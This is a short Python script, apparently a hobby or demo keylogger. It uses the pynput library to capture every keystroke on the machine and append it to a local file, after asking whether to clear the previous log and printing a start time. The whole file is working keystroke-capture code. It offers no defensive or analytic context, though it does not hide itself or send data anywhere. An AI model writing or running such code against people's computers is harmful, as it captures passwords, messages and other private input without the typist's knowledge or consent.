from pynput.keyboard import Key, Listener 
import logging
import datetime


def main():
	clearfile = input("Do you want to clear file from previous logging? (y/n): ")
	if clearfile == 'y':
		try:
			file = open("keyloggerout.txt","r+")
			file.truncate(0)
			file.close()
			print("File cleared")
		except:
			print("File does not exist yet")

	x = datetime.datetime.now()
	print("Keylogging start: " + str(x))


	logging.basicConfig(filename = ("keyloggerout.txt"), level = logging.DEBUG, format='%(message)s')

	def on_press(key):
		logging.info(str(key))


	with Listener(on_press=on_press) as listener:
		listener.join()





if __name__ == '__main__':
	main()



